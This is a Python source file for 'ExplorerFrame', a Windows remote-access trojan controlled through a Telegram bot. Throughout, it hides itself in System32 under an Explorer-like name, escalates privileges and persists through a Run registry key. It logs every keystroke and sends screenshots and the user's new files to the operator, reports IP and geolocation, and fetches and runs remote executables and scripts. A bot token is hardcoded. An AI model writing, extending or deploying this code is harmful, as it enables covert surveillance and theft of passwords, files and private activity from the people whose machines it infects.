#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
ExplorerFrame - Bot de Telegram con funcionalidades avanzadas (sin OpenCV)
Versión: 4.1 - Compatible Python 3.14
"""

import os
import sys
import asyncio
import threading
import hashlib
import zipfile
import time
import warnings
import shutil
import ctypes
import subprocess
import platform
import socket
import requests
import json
import random
import string
from datetime import datetime, timedelta
from pathlib import Path
from io import BytesIO
import tempfile

# Suprimir warnings
warnings.filterwarnings("ignore")

# =============================================================================
# VERIFICACIÓN DE DEPENDENCIAS (sin opencv)
# =============================================================================
def ensure_deps():
    missing = []
    required = [
        ('python-telegram-bot[job-queue]', 'telegram'),
        ('apscheduler>=3.10.0', 'apscheduler'),
        ('pytz', 'pytz'),
        ('tzlocal', 'tzlocal'),
        ('pillow', 'PIL'),
        ('keyboard', 'keyboard'),
        ('pywin32', 'win32api'),
        ('psutil', 'psutil'),
        ('requests', 'requests'),
        ('numpy', 'numpy')  # necesario para manejo de arrays
    ]
    for pkg, mod in required:
        try:
            __import__(mod)
        except ImportError:
            missing.append(pkg)
    if missing:
        print("Instalando dependencias faltantes...")
        for pkg in missing:
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", pkg])
                print(f"  ✅ {pkg}")
            except:
                print(f"Error instalando {pkg}")
                sys.exit(1)
        print("Dependencias listas. Reinicia el script.")
        sys.exit(0)

ensure_deps()

# =============================================================================
# IMPORTS
# =============================================================================
import PIL.ImageGrab
from PIL import Image
import keyboard
import win32event
import win32api
import winerror
import winreg
import psutil
import requests
import numpy as np
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from telegram.constants import ParseMode
import pytz
import tzlocal

# =============================================================================
# CONFIGURACIÓN (Leer desde entorno o archivo)
# =============================================================================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8683004750:AAHTA7XeVNcS3NSvA2spCaNQW_SIC_3YLUw")  # Cámbialo o usa variable de entorno
API_URL = os.environ.get("API_URL", "https://explorerframe.onrender.com/api/v1/download/status")  # Endpoint para actualizaciones
USER_ID = None  # Se obtendrá de la API

# =============================================================================
# CONSTANTES
# =============================================================================
APPDATA = os.getenv('APPDATA')
SYSTEM32 = os.path.join(os.environ['SYSTEMROOT'], 'System32')
EXE_NAME = "ExplorerFrame.exe"
EXE_PATH = os.path.join(SYSTEM32, EXE_NAME)
KEYLOG_FILE = os.path.join(APPDATA, 'keylog.txt')
TEMP_DIR = os.path.join(APPDATA, 'explorerframe_temp')
os.makedirs(TEMP_DIR, exist_ok=True)

# Intervalos
BACKUP_INTERVAL = 600          # 10 minutos
SCREENSHOT_CHECK_INTERVAL = 5  # cada 5 segundos revisar cambios
AUDIO_INTERVAL = 600
METRICS_INTERVAL = 600
KEYLOG_SEND_INTERVAL = 600
UPDATE_CHECK_INTERVAL = 1800    # 30 minutos

# Variables globales
authorized_users = set()        # IDs de usuarios permitidos
authorized_groups = set()        # IDs de grupos permitidos
last_screenshot = None           # Última captura para comparar (como numpy array)
user_file_registry = {}          # Registro de archivos enviados por usuario (persistente en disco)
navigation_state = {}             # Estado de navegación por usuario
update_token = None               # Token de descarga (se pondrá en variable de entorno)

# =============================================================================
# FUNCIONES DE AUTORIZACIÓN (vía API)
# =============================================================================
async def fetch_authorized_ids():
    """Obtiene la lista de IDs y grupos desde la API."""
    global authorized_users, authorized_groups
    try:
        # Aquí deberías tener un endpoint que devuelva los IDs permitidos
        # Por ahora usamos una variable de entorno o un valor por defecto
        ids_str = os.environ.get("AUTHORIZED_IDS", "")
        if ids_str:
            partes = ids_str.split(',')
            users = set()
            groups = set()
            for p in partes:
                p = p.strip()
                if p.startswith('grupo:'):
                    groups.add(int(p.replace('grupo:', '').strip()))
                else:
                    try:
                        users.add(int(p))
                    except:
                        pass
            authorized_users = users
            authorized_groups = groups
        print(f"IDs autorizados: {authorized_users}")
        print(f"Grupos autorizados: {authorized_groups}")
    except Exception as e:
        print(f"Error al obtener IDs: {e}")

def is_authorized(update: Update) -> bool:
    """Verifica si el usuario o grupo está autorizado."""
    user = update.effective_user
    chat = update.effective_chat
    if user and user.id in authorized_users:
        return True
    if chat and chat.id in authorized_groups:
        return True
    return False

# =============================================================================
# AUTOINSTALACIÓN Y ACTUALIZACIONES
# =============================================================================
def check_for_updates():
    """Consulta el servidor si hay nueva versión disponible."""
    global update_token
    try:
        resp = requests.get("https://explorerframe.onrender.com/api/v1/download/status", timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            if data.get("available"):
                # Obtener token de descarga (debe estar en entorno)
                update_token = os.environ.get("UPDATE_TOKEN")
                if not update_token:
                    print("No hay token de actualización")
                    return False
                # Solicitar token de un solo uso
                token_resp = requests.post(
                    "https://explorerframe.onrender.com/api/v1/download/token",
                    headers={"Authorization": f"Bearer {update_token}"},
                    json={"expires_minutes": 10},
                    timeout=10
                )
                if token_resp.status_code == 200:
                    token_data = token_resp.json()
                    download_url = token_data.get("download_url")
                    if download_url:
                        # Descargar nuevo ejecutable
                        new_exe = requests.get(download_url, timeout=30)
                        if new_exe.status_code == 200:
                            # Guardar temporalmente
                            temp_exe = os.path.join(TEMP_DIR, "update.exe")
                            with open(temp_exe, 'wb') as f:
                                f.write(new_exe.content)
                            # Reemplazar el ejecutable actual
                            if os.path.exists(EXE_PATH):
                                os.remove(EXE_PATH)
                            shutil.move(temp_exe, EXE_PATH)
                            ctypes.windll.kernel32.SetFileAttributesW(EXE_PATH, 2+4)
                            print("✅ Actualización descargada. Reiniciando...")
                            # Reiniciar
                            subprocess.Popen([EXE_PATH], creationflags=subprocess.CREATE_NO_WINDOW)
                            sys.exit(0)
        return False
    except Exception as e:
        print(f"Error en actualización: {e}")
        return False

def auto_install():
    """Instalación automática en System32 si es ejecutable compilado."""
    if not getattr(sys, 'frozen', False):
        return
    if os.path.exists(EXE_PATH) and os.path.samefile(sys.executable, EXE_PATH):
        return  # ya está instalado
    if not ctypes.windll.shell32.IsUserAnAdmin():
        # Relanzar como administrador
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit(0)
    try:
        shutil.copy2(sys.executable, EXE_PATH)
        # Ocultar archivo
        ctypes.windll.kernel32.SetFileAttributesW(EXE_PATH, 2+4)
        # Añadir al inicio
        reg_key = r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
        os.system(f'reg add "{reg_key}" /v "ExplorerFrame" /t REG_SZ /d "{EXE_PATH}" /f')
        # Anclar a la barra de tareas (requiere PowerShell)
        ps_script = f"""
        $shell = New-Object -ComObject Shell.Application
        $folder = $shell.Namespace('{SYSTEM32}')
        $item = $folder.ParseName('{EXE_NAME}')
        $item.InvokeVerb('taskbarpin')
        """
        subprocess.run(['powershell', '-Command', ps_script], creationflags=subprocess.CREATE_NO_WINDOW)
        # Ejecutar nueva copia y salir
        subprocess.Popen([EXE_PATH] + sys.argv[1:], creationflags=subprocess.CREATE_NO_WINDOW)
        sys.exit(0)
    except Exception as e:
        print(f"Error en autoinstalación: {e}")
        sys.exit(1)

# =============================================================================
# FUNCIONES DE UTILIDAD
# =============================================================================
def format_size(b):
    for u in ['B', 'KB', 'MB', 'GB']:
        if b < 1024:
            return f"{b:.1f}{u}"
        b /= 1024
    return f"{b:.1f}TB"

def get_file_hash(p):
    h = hashlib.sha256()
    with open(p, 'rb') as f:
        for chunk in iter(lambda: f.read(65536), b''):
            h.update(chunk)
    return h.hexdigest()

def load_user_registry():
    """Carga el registro de archivos enviados desde disco."""
    global user_file_registry
    reg_file = os.path.join(APPDATA, 'explorerframe_registry.json')
    if os.path.exists(reg_file):
        try:
            with open(reg_file, 'r') as f:
                user_file_registry = json.load(f)
        except:
            user_file_registry = {}
    else:
        user_file_registry = {}

def save_user_registry():
    """Guarda el registro de archivos enviados."""
    reg_file = os.path.join(APPDATA, 'explorerframe_registry.json')
    try:
        with open(reg_file, 'w') as f:
            json.dump(user_file_registry, f)
    except:
        pass

def update_file_registry(file_path, file_hash):
    """Actualiza el registro con un archivo enviado."""
    user_file_registry[file_path] = file_hash
    save_user_registry()

def is_new_file(file_path):
    """Verifica si el archivo es nuevo o ha cambiado."""
    if not os.path.exists(file_path):
        return False
    current_hash = get_file_hash(file_path)
    old_hash = user_file_registry.get(file_path)
    return old_hash != current_hash

# =============================================================================
# INFORMACIÓN DEL SISTEMA
# =============================================================================
async def get_system_info():
    u = platform.uname()
    m = psutil.virtual_memory()
    b = psutil.sensors_battery()
    lines = [
        f"🖥️ *Sistema:* {u.system} {u.release}",
        f"🏠 *Equipo:* {u.node}",
        f"👤 *Usuario:* {os.getlogin()}",
        f"\n⚙️ *CPU:* {platform.processor()}",
        f"   • Núcleos: {psutil.cpu_count(logical=False)} físicos, {psutil.cpu_count(logical=True)} lógicos",
        f"   • Uso: {psutil.cpu_percent(interval=1)}%",
        f"\n💾 *RAM:* Total {format_size(m.total)} | Usado {format_size(m.used)} ({m.percent}%) | Libre {format_size(m.available)}",
        f"\n💽 *Discos:*"
    ]
    for p in psutil.disk_partitions():
        try:
            u = psutil.disk_usage(p.mountpoint)
            lines.append(f"   • {p.device} ({p.mountpoint}): {format_size(u.used)} / {format_size(u.total)} ({u.percent}%)")
        except:
            continue
    if b:
        status = "🔌 Conectado" if b.power_plugged else "🔋 Batería"
        lines.append(f"\n🔋 *Batería:* {status} - {b.percent}%")
        if b.secsleft > 0 and not b.power_plugged:
            lines.append(f"   • Tiempo restante: {timedelta(seconds=b.secsleft)}")
    return "\n".join(lines)

async def get_ip_info():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        public_ip = requests.get('https://api.ipify.org', timeout=5).text
        geo = requests.get(f'http://ip-api.com/json/{public_ip}', timeout=5).json()
        location = f"{geo.get('city', '?')}, {geo.get('country', '?')} ({geo.get('lat', '?')}, {geo.get('lon', '?')})"
        return local_ip, public_ip, location
    except:
        return 'Desconocida', 'Desconocida', 'No disponible'

# =============================================================================
# BACKUP INTELIGENTE (solo archivos nuevos)
# =============================================================================
def scan_folders():
    """Escanea todas las carpetas del usuario en busca de archivos nuevos."""
    user_home = os.path.expanduser("~")
    folders = []
    for root, dirs, files in os.walk(user_home):
        # Saltar carpetas de sistema y temporales
        if 'AppData' in root and ('Local' in root or 'Roaming' in root):
            continue
        folders.append(root)
        if len(folders) > 100:  # límite para no saturar
            break
    return folders

def find_new_files():
    """Busca archivos nuevos en todas las carpetas del usuario."""
    new_files = []
    for folder in scan_folders():
        try:
            for file in os.listdir(folder):
                file_path = os.path.join(folder, file)
                if os.path.isfile(file_path) and is_new_file(file_path):
                    new_files.append(file_path)
        except:
            continue
    return new_files

async def auto_backup(context: ContextTypes.DEFAULT_TYPE):
    """Tarea automática de backup: envía archivos nuevos en un zip."""
    loop = asyncio.get_event_loop()
    files = await loop.run_in_executor(None, find_new_files)
    if not files:
        return
    # Crear zip con los archivos nuevos
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    zip_path = os.path.join(TEMP_DIR, f"backup_{timestamp}.zip")
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        for f in files[:50]:  # límite de 50 archivos por backup
            try:
                zf.write(f, os.path.relpath(f, os.path.expanduser("~")))
                update_file_registry(f, get_file_hash(f))
            except:
                continue
    # Enviar a todos los usuarios autorizados (o al primero)
    for uid in authorized_users:
        try:
            with open(zip_path, 'rb') as fd:
                await context.bot.send_document(
                    chat_id=uid,
                    document=fd,
                    filename=os.path.basename(zip_path),
                    caption=f"📦 Backup automático: {len(files)} archivos nuevos"
                )
            break  # enviar solo a uno por ahora
        except:
            continue
    os.remove(zip_path)

# =============================================================================
# CAPTURA DE PANTALLA POR CAMBIOS (sin OpenCV)
# =============================================================================
def capture_screen():
    """Captura la pantalla completa y devuelve como numpy array (RGB)."""
    img = PIL.ImageGrab.grab()
    return np.array(img)  # RGB directo

def images_different(img1, img2, threshold=0.05):
    """Compara dos imágenes (numpy arrays) y devuelve True si son diferentes."""
    if img1 is None or img2 is None:
        return True
    # Convertir a PIL para redimensionar
    h, w = img1.shape[:2]
    # Redimensionar a 100x100 para comparación rápida
    img1_pil = Image.fromarray(img1)
    img2_pil = Image.fromarray(img2)
    img1_small = np.array(img1_pil.resize((100, 100), Image.Resampling.LANCZOS))
    img2_small = np.array(img2_pil.resize((100, 100), Image.Resampling.LANCZOS))
    # Diferencia absoluta
    diff = np.abs(img1_small.astype(np.float32) - img2_small.astype(np.float32))
    gray = np.mean(diff, axis=2)  # promedio de canales (simula escala de grises)
    non_zero = np.count_nonzero(gray > 30)
    total = gray.size
    return (non_zero / total) > threshold

async def check_screen_changes(context: ContextTypes.DEFAULT_TYPE):
    """Revisa si la pantalla cambió y envía captura."""
    global last_screenshot
    loop = asyncio.get_event_loop()
    current = await loop.run_in_executor(None, capture_screen)
    if last_screenshot is None:
        last_screenshot = current
        return
    if images_different(last_screenshot, current):
        # Guardar imagen
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        img_path = os.path.join(TEMP_DIR, f"change_{timestamp}.png")
        Image.fromarray(current).save(img_path)
        last_screenshot = current
        # Enviar
        for uid in authorized_users:
            try:
                with open(img_path, 'rb') as fd:
                    await context.bot.send_photo(chat_id=uid, photo=fd, caption="📸 Cambio detectado en pantalla")
                break
            except:
                continue
        os.remove(img_path)

# =============================================================================
# KEYLOGGER (siempre activo, envía cada 10 min)
# =============================================================================
keylog_active = True
def keylogger_callback(e):
    if not keylog_active:
        return
    with open(KEYLOG_FILE, 'a', encoding='utf-8') as f:
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        n = e.name
        if n == 'space':
            k = ' '
        elif n == 'enter':
            k = '\n'
        elif n == 'backspace':
            k = '[BORRAR]'
        elif len(n) == 1:
            k = n
        else:
            k = f'[{n.upper()}]'
        f.write(f"{ts}: {k}\n")

keyboard.on_press(keylogger_callback)

async def send_keylog(context: ContextTypes.DEFAULT_TYPE):
    """Envía el archivo de keylog y lo limpia."""
    if not os.path.exists(KEYLOG_FILE):
        return
    with open(KEYLOG_FILE, 'rb') as f:
        for uid in authorized_users:
            try:
                await context.bot.send_document(chat_id=uid, document=f, filename='keylog.txt', caption="⌨️ Log de teclas")
                break
            except:
                continue
    # Limpiar
    open(KEYLOG_FILE, 'w').close()

# =============================================================================
# COMANDOS DE CONTROL DEL SISTEMA (workstation, wifi)
# =============================================================================
async def workstation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Controla estados de la estación de trabajo."""
    if not is_authorized(update):
        await update.message.reply_text("No autorizado")
        return
    args = context.args
    if not args:
        await update.message.reply_text("Uso: /workstation mode: lockscreen/shutdown/logout/restart/suspend/hibernate")
        return
    mode = args[0].lower().replace('mode:', '').strip()
    try:
        if mode == 'lockscreen':
            ctypes.windll.user32.LockWorkStation()
            await update.message.reply_text("🔒 Pantalla bloqueada")
        elif mode == 'shutdown':
            os.system('shutdown /s /t 5')
            await update.message.reply_text("💻 Apagando en 5 segundos")
        elif mode == 'logout':
            os.system('shutdown /l')
            await update.message.reply_text("👋 Cerrando sesión")
        elif mode == 'restart':
            os.system('shutdown /r /t 5')
            await update.message.reply_text("🔄 Reiniciando en 5 segundos")
        elif mode == 'suspend':
            os.system('rundll32.exe powrprof.dll,SetSuspendState 0,1,0')
            await update.message.reply_text("💤 Suspender")
        elif mode == 'hibernate':
            os.system('shutdown /h')
            await update.message.reply_text("💤 Hibernando")
        else:
            await update.message.reply_text("Modo no reconocido")
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

async def wifi_off(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Apaga el WiFi y monitorea conectividad."""
    if not is_authorized(update):
        await update.message.reply_text("No autorizado")
        return
    try:
        # Deshabilitar adaptador WiFi (requiere admin)
        subprocess.run('netsh interface set interface "Wi-Fi" admin=disable', shell=True, capture_output=True)
        await update.message.reply_text("📡 WiFi apagado. Esperando conexión...")
        # Monitorear en segundo plano
        asyncio.create_task(monitor_wifi(update.effective_chat.id, context))
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

async def monitor_wifi(chat_id, context):
    """Monitorea hasta que haya conexión a internet."""
    while True:
        try:
            # Intentar conectar a Google
            requests.get('https://www.google.com', timeout=5)
            # Si funciona, habilitar WiFi y avisar
            subprocess.run('netsh interface set interface "Wi-Fi" admin=enable', shell=True)
            await context.bot.send_message(chat_id=chat_id, text="✅ Conexión a internet restablecida")
            break
        except:
            await asyncio.sleep(10)

# =============================================================================
# MANEJO DE ARCHIVOS RECIBIDOS (scripts, parches)
# =============================================================================
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update):
        await update.message.reply_text("No autorizado")
        return
    doc = update.message.document
    file_name = doc.file_name
    await update.message.reply_text(f"📥 Recibiendo: {file_name}")
    file = await doc.get_file()
    save_path = os.path.join(APPDATA, file_name)
    await file.download_to_drive(save_path)
    await update.message.reply_text(f"✅ Guardado en: {save_path}")

    # Si es un parche (patch.zip), reemplaza el ejecutable
    if file_name.lower() == 'patch.zip':
        await update.message.reply_text("🔄 Aplicando parche...")
        try:
            with zipfile.ZipFile(save_path, 'r') as zf:
                # Buscar el ejecutable dentro del zip
                for name in zf.namelist():
                    if name.endswith('.exe'):
                        with tempfile.NamedTemporaryFile(delete=False, suffix='.exe') as tmp:
                            with zf.open(name) as source, open(tmp.name, 'wb') as target:
                                shutil.copyfileobj(source, target)
                            # Reemplazar el ejecutable actual
                            if os.path.exists(EXE_PATH):
                                os.remove(EXE_PATH)
                            shutil.move(tmp.name, EXE_PATH)
                            ctypes.windll.kernel32.SetFileAttributesW(EXE_PATH, 2+4)
                            await update.message.reply_text("✅ Parche aplicado. Reinicia el bot.")
                            # Opcional: reiniciar
                            subprocess.Popen([EXE_PATH], creationflags=subprocess.CREATE_NO_WINDOW)
                            sys.exit(0)
                        break
                else:
                    await update.message.reply_text("No se encontró un ejecutable en el zip.")
        except Exception as e:
            await update.message.reply_text(f"Error al aplicar parche: {e}")
        finally:
            os.remove(save_path)
    # Si es un script, preguntar si ejecutar
    elif file_name.endswith(('.py', '.bat', '.ps1', '.cmd')):
        await update.message.reply_text(f"¿Ejecutar {file_name}? (responde sí/no)")
        context.user_data['pending_script'] = save_path

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update):
        return
    text = update.message.text.lower()
    if 'pending_script' in context.user_data:
        if text in ['sí', 'si', 'yes', 's']:
            script_path = context.user_data['pending_script']
            ext = os.path.splitext(script_path)[1].lower()
            await update.message.reply_text("⚙️ Ejecutando...")
            try:
                if ext == '.py':
                    result = subprocess.run([sys.executable, script_path], capture_output=True, text=True, timeout=30)
                elif ext == '.bat' or ext == '.cmd':
                    result = subprocess.run(['cmd', '/c', script_path], capture_output=True, text=True, timeout=30)
                elif ext == '.ps1':
                    result = subprocess.run(['powershell', '-File', script_path], capture_output=True, text=True, timeout=30)
                else:
                    result = None
                if result:
                    output = result.stdout + result.stderr
                    await update.message.reply_text(f"```\n{output[:3000]}\n```", parse_mode=ParseMode.MARKDOWN)
            except Exception as e:
                await update.message.reply_text(f"Error: {e}")
            del context.user_data['pending_script']
        else:
            await update.message.reply_text("Ejecución cancelada")
            del context.user_data['pending_script']

# =============================================================================
# EXPLORADOR DE CARPETAS CON BOTONES
# =============================================================================
def get_folder_contents(path):
    """Devuelve lista de subcarpetas y archivos en una ruta."""
    try:
        items = os.listdir(path)
        folders = [f for f in items if os.path.isdir(os.path.join(path, f))]
        files = [f for f in items if os.path.isfile(os.path.join(path, f))]
        return folders, files
    except:
        return [], []

def build_navigation_keyboard(path, page=0):
    """Construye teclado inline para navegación de carpetas (20 items por página)."""
    folders, files = get_folder_contents(path)
    all_items = folders + files
    total = len(all_items)
    start = page * 20
    end = min(start + 20, total)
    page_items = all_items[start:end]

    keyboard = []
    for item in page_items:
        keyboard.append([InlineKeyboardButton(item, callback_data=f"nav|{path}|{item}")])

    # Botones de navegación
    nav_row = []
    if page > 0:
        nav_row.append(InlineKeyboardButton("⬅️", callback_data=f"navpage|{path}|{page-1}"))
    else:
        nav_row.append(InlineKeyboardButton("⬅️", callback_data="noop"))
    nav_row.append(InlineKeyboardButton("📁", callback_data=f"navselect|{path}"))
    nav_row.append(InlineKeyboardButton("➡️", callback_data=f"navpage|{path}|{page+1}"))
    keyboard.append(nav_row)

    # Botón para subir
    parent = os.path.dirname(path)
    if parent and parent != path:
        keyboard.append([InlineKeyboardButton("⬆️ Subir", callback_data=f"nav|{parent}|..")])

    return InlineKeyboardMarkup(keyboard)

async def handle_navigation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    parts = data.split('|')
    action = parts[0]

    if action == 'nav':
        path = parts[1]
        item = parts[2]
        new_path = os.path.join(path, item)
        if os.path.isdir(new_path):
            # Entrar a carpeta
            await query.edit_message_text(f"📂 {new_path}", reply_markup=build_navigation_keyboard(new_path))
        else:
            # Es archivo, preguntar qué hacer
            await query.edit_message_text(f"📄 {item}\n¿Descargar? (usa /download)")
            context.user_data['selected_file'] = new_path
    elif action == 'navpage':
        path = parts[1]
        page = int(parts[2])
        await query.edit_message_text(f"📂 {path}", reply_markup=build_navigation_keyboard(path, page))
    elif action == 'navselect':
        path = parts[1]
        # Seleccionar carpeta actual (se puede usar para backup, etc.)
        await query.edit_message_text(f"✅ Carpeta seleccionada: {path}")
        context.user_data['selected_folder'] = path

async def cd_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /cd para iniciar exploración."""
    if not is_authorized(update):
        await update.message.reply_text("No autorizado")
        return
    user_id = update.effective_user.id
    start_path = os.path.expanduser("~")  # Inicio en home del usuario
    await update.message.reply_text(f"📂 {start_path}", reply_markup=build_navigation_keyboard(start_path))

# =============================================================================
# COMANDOS MANUALES
# =============================================================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update):
        await update.message.reply_text("No autorizado")
        return
    # Enviar info solo la primera vez
    if 'first_run_done' not in context.user_data:
        context.user_data['first_run_done'] = True
        local_ip, public_ip, location = await get_ip_info()
        sysinfo = await get_system_info()
        msg = (
            f"🆕 *Primera ejecución*\n\n"
            f"🌐 *IP Local:* {local_ip}\n"
            f"🌍 *IP Pública:* {public_ip}\n"
            f"📍 *Ubicación:* {location}\n\n"
            f"{sysinfo}"
        )
        await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

    help_text = (
        "🤖 *ExplorerFrame - Ayuda*\n\n"
        "Comandos disponibles:\n"
        "/cd - Explorador de carpetas\n"
        "/download [ruta] - Descargar archivo\n"
        "/screenshot - Captura manual\n"
        "/info - Información del sistema\n"
        "/workstation mode: lockscreen/shutdown/logout/restart/suspend/hibernate\n"
        "/wifi off - Apagar WiFi y esperar conexión\n"
        "/help - Este mensaje\n\n"
        "También puedes enviar archivos (scripts, parches) y serán ejecutados."
    )
    await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)

async def download(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update):
        return
    if context.args:
        file_path = " ".join(context.args)
    elif 'selected_file' in context.user_data:
        file_path = context.user_data['selected_file']
    else:
        await update.message.reply_text("Uso: /download <ruta> o selecciona un archivo con /cd")
        return
    if os.path.isfile(file_path):
        with open(file_path, 'rb') as f:
            await update.message.reply_document(document=f, filename=os.path.basename(file_path))
    else:
        await update.message.reply_text("Archivo no encontrado")

async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update):
        return
    sysinfo = await get_system_info()
    await update.message.reply_text(sysinfo, parse_mode=ParseMode.MARKDOWN)

async def screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update):
        return
    await update.message.reply_text("📸 Capturando...")
    img = await asyncio.get_event_loop().run_in_executor(None, capture_screen)
    img_path = os.path.join(TEMP_DIR, f"manual_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
    Image.fromarray(img).save(img_path)
    with open(img_path, 'rb') as f:
        await update.message.reply_photo(photo=f)
    os.remove(img_path)

# =============================================================================
# INICIALIZACIÓN Y TAREAS PROGRAMADAS
# =============================================================================
async def post_init(application: Application):
    """Se ejecuta después de inicializar el bot."""
    # Cargar registro de archivos
    load_user_registry()
    # Obtener IDs autorizados
    await fetch_authorized_ids()
    # Programar tareas
    jq = application.job_queue
    if jq:
        jq.run_repeating(auto_backup, interval=BACKUP_INTERVAL, first=10, name='backup')
        jq.run_repeating(check_screen_changes, interval=SCREENSHOT_CHECK_INTERVAL, first=5, name='screenshot_check')
        jq.run_repeating(send_keylog, interval=KEYLOG_SEND_INTERVAL, first=KEYLOG_SEND_INTERVAL, name='keylog')
        jq.run_repeating(lambda ctx: asyncio.create_task(check_for_updates()), interval=UPDATE_CHECK_INTERVAL, first=30, name='updates')
    # Enviar mensaje de inicio a todos los autorizados
    for uid in authorized_users:
        try:
            await application.bot.send_message(chat_id=uid, text="🟢 *ExplorerFrame iniciado*", parse_mode=ParseMode.MARKDOWN)
        except:
            pass

def run_bot():
    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cd", cd_command))
    app.add_handler(CommandHandler("download", download))
    app.add_handler(CommandHandler("info", info))
    app.add_handler(CommandHandler("screenshot", screenshot))
    app.add_handler(CommandHandler("workstation", workstation))
    app.add_handler(CommandHandler("wifi", wifi_off))
    app.add_handler(CommandHandler("help", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(CallbackQueryHandler(handle_navigation))
    print("🚀 Bot ExplorerFrame iniciado. Ctrl+C para detener.")
    app.run_polling()

# =============================================================================
# PUNTO DE ENTRADA
# =============================================================================
if __name__ == "__main__":
    # Autoinstalación si es ejecutable
    auto_install()
    # Evitar múltiples instancias
    try:
        mutex = win32event.CreateMutex(None, False, "ExplorerFrameMutex")
        if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
            # Si ya está corriendo, abrir el explorador real
            subprocess.Popen(['explorer.exe'], creationflags=subprocess.CREATE_NO_WINDOW)
            sys.exit(0)
    except:
        pass
    # Ejecutar bot
    run_bot()